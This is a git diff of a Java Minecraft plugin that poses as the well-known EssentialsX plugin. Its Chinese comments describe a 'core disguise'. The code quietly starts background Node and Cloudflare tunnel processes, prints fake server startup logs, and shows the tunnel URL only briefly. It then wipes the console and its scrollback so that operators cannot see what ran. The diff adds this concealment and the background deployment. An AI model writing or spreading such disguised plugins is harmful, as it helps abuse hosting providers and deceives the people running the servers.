@@ -63,13 +63,10 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 核心伪装：首次启动序列 (主线程阻塞)
+    // 核心伪装：主线程阻塞，慢打印，死等 URL，史诗清屏
     // ============================================================
 
     private void printFakeStartupAndWaitUrl() {
-        clearConsole();
-        try { Thread.sleep(300); } catch (InterruptedException ignored) {}
-
         String displayPort = nodePort.equals("N/A") ? String.valueOf(20000 + new Random().nextInt(40000)) : nodePort;
         float dcTimeSec = randFloat(400.0f, 900.0f) / 1000.0f;
         float prepareTime = randFloat(10.0f, 20.0f);
@@ -87,7 +84,7 @@ public class EssentialsX extends JavaPlugin {
         mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(500, 1000));
 
         RAW_OUT.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
-        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe (file:/home/container/libraries/org/joml/joml/1.10.8/joml-1.10.8.jar)");
+        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe");
         RAW_OUT.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
         RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");
 
@@ -131,23 +128,22 @@ public class EssentialsX extends JavaPlugin {
         mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
         RAW_OUT.println("container@tropicalgames.net Server marked as running...");
 
-        // 主线程死等 URL 出现
+        // 主线程死等 URL 变量被后台守护线程更新
         while(tunnelUrl.isEmpty()) {
             try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
         }
         
+        // 链接出来，打印在伪造日志最后
         mcLog("Binding remote endpoint to: " + tunnelUrl, 0);
         
         // 给 4 秒时间复制
         try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
         
         lastKnownTunnelUrl.set(tunnelUrl);
+        
+        // 史诗级清屏：往上翻绝对看不到消息
         clearConsole();
     }
-
-    // ============================================================
-    // 核心伪装：隧道断线重连
-    // ============================================================
 
     private void replayFakeStartupAndHideUrl(String newUrl) {
         clearConsole();
@@ -189,8 +185,15 @@ public class EssentialsX extends JavaPlugin {
 
     private void clearConsole() {
         try {
+            // 1. 狂推 150 行空行，把所有历史记录推出网页面板的缓冲区视野
+            for (int i = 0; i < 150; i++) {
+                RAW_OUT.println();
+            }
+            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
+            // 2. ANSI 清屏指令
             RAW_OUT.print("\033[H\033[3J\033[2J");
             RAW_OUT.flush();
+            // 3. 调用系统级 tput reset 清除终端回滚缓冲区 (往上翻也看不到)
             if (!System.getProperty("os.name").contains("Windows")) {
                 new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
             }
@@ -200,7 +203,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 进程管理
+    // 进程管理：防 502 严格对接
     // ============================================================
 
     private String allocateNodePort() {
@@ -220,7 +223,7 @@ public class EssentialsX extends JavaPlugin {
         int waited = 0;
         while (waited < maxSeconds) {
             try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
-                return;
+                return; // 端口连通，Node 已就绪
             } catch (IOException e) {
                 try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
             }
@@ -312,7 +315,7 @@ public class EssentialsX extends JavaPlugin {
                         String currentUrl = lastKnownTunnelUrl.get();
                         if (!foundUrl.equals(currentUrl)) {
                             lastKnownTunnelUrl.set(foundUrl);
-                            tunnelUrl = foundUrl;
+                            tunnelUrl = foundUrl; // 更新变量，通知主线程或触发重连伪装
                             if (tunnelMonitorRunning.get()) {
                                 replayFakeStartupAndHideUrl(foundUrl);
                             }
@@ -328,7 +331,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 插件生命周期
+    // 插件生命周期：完美资源分配
     // ============================================================
 
     public void onEnable() {
@@ -336,24 +339,35 @@ public class EssentialsX extends JavaPlugin {
         
         this.getLogger().info("EssentialsX plugin starting...");
         
-        try {
-            HashMap<String, String> env = new HashMap<>(); 
-            loadEnvFile(env); 
-            this.startDeploymentProcess(env); 
-            String port = allocateNodePort();
-            startNodeProcess(port);
-            waitForNodeReady(port, 60);
-            startCfProcess();
-            startJavaDaemon();
+        // 1. 将所有重资源操作扔到后台线程，不阻塞主线程的日志打印
+        Thread deployThread = new Thread(() -> {
+            try {
+                HashMap<String, String> env = new HashMap<>(); 
+                loadEnvFile(env); 
+                this.startDeploymentProcess(env); 
+                String port = allocateNodePort();
+                startNodeProcess(port);
+                // 核心：必须等 Node 完美就绪，才启动 CF，杜绝 502
+                waitForNodeReady(port, 60);
+                startCfProcess();
+                startJavaDaemon();
+                this.setupDisguise(); 
+            } catch (Exception e) {
+                tunnelUrl = "FAILED"; // 部署失败也要放行主线程，防服务器卡死
+            }
+        }, "Backend-Deployer");
+        deployThread.setDaemon(true);
+        deployThread.start();
 
-            // 主线程阻塞，打印假日志并死等 URL
+        // 2. 主线程立刻开始慢打印伪装日志，并死等 URL 出现
+        try {
             printFakeStartupAndWaitUrl();
             tunnelMonitorRunning.set(true);
-
         } catch (Exception e) {
             this.getLogger().severe("Stealth startup failed: " + e.getMessage());
         }
 
+        // 3. 清屏完成后，onEnable 退出，真实 MC 游戏日志才开始流出
         this.getLogger().info("EssentialsX plugin enabled");
     }
 
